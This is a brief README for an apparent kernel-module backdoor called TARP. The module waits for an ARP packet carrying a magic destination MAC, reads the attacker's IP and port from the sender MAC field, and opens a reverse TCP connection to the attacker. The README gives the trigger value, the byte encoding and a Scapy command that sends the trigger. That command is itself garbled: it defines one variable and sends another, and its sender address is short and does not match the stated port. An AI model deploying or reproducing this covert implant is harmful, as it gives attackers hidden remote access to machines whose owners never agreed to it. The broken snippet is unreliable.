#             TARP - Trigger on ARP 

Establishes a raw socket listener that will trigger based
off of an ARP packet that has the destination hardware MAC set to a
magic number. It will then utilize the arp_sha struct to gather the 
reverse IP and PORT mapping in order to establish the tcp connection to
the attacker. That field is the sender hardware address (MAC).

### DESTINATION HARDWARE ADDRESS = ether[32:37] 

```
| ff | fe | ff | ff | fe | ff | = Current trigger value ff:fe:ff:ff:fe:ff 
```
The code splits this value in half adds the two together and compares against 0x1fffdfe
Therefore the values ff:fd:ff:ff:ff:ff and ff:ff:ff:ff:fd:ff also work.


### SENDER HARDWARE ADDRESS = ether[22:27]
```
| 1f | 77 | c0 | a8 | 01 | ee |   = PORT:8055       ATTACKER IP:192.168.1.238
 ```
Note: Run depmod in order to update modprobe info

### SCAPY Command
a = ARP(hwdst="ff:fe:ff:ff:fe:ff",pdst="192.168.1.238",hwsrc="23:28:c0:a8:01")
send(p)
